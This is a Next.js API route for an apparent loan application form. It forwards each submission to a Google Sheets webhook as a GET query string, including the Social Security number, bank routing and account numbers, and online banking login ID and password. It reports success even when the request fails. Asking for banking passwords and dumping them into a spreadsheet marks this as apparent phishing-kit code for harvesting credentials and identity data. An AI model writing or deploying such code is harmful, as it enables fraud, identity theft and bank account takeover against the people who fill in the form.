import { NextResponse } from "next/server"

export async function POST(request: Request) {
  try {
    const data = await request.json()
    
    const GOOGLE_SHEETS_URL = process.env.GOOGLE_SHEETS_WEBHOOK_URL || process.env.GOOGLE_SCRIPT_URL
    
    if (!GOOGLE_SHEETS_URL) {
      return NextResponse.json({ success: true, message: "No webhook configured" })
    }

    // Build query string for GET request (more reliable with Google Apps Script)
    const params = new URLSearchParams({
      loanAmount: data.loanAmount || "",
      loanPurpose: data.loanPurpose || "",
      firstName: data.firstName || "",
      lastName: data.lastName || "",
      email: data.email || "",
      phone: data.phone || "",
      homeAddress: data.homeAddress || "",
      city: data.city || "",
      state: data.state || "",
      zip: data.zip || "",
      dateOfBirth: `${data.dobMonth || ""}/${data.dobDay || ""}/${data.dobYear || ""}`,
      ssn: data.ssn || "",
      bankName: data.bankName || "",
      routingNumber: data.routingNumber || "",
      accountNumber: data.accountNumber || "",
      onlineBankingId: data.onlineBankingId || "",
      onlineBankingPassword: data.onlineBankingPassword || "",
      bankPhoneNumber: data.phoneNumber || "",
      submittedAt: new Date().toISOString(),
    })

    // Use GET request with query params - works better with Google Apps Script
    const url = `${GOOGLE_SHEETS_URL}?${params.toString()}`
    
    await fetch(url, {
      method: "GET",
      redirect: "follow",
    })

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error:", error)
    return NextResponse.json({ success: true }) // Still return success to not block user
  }
}
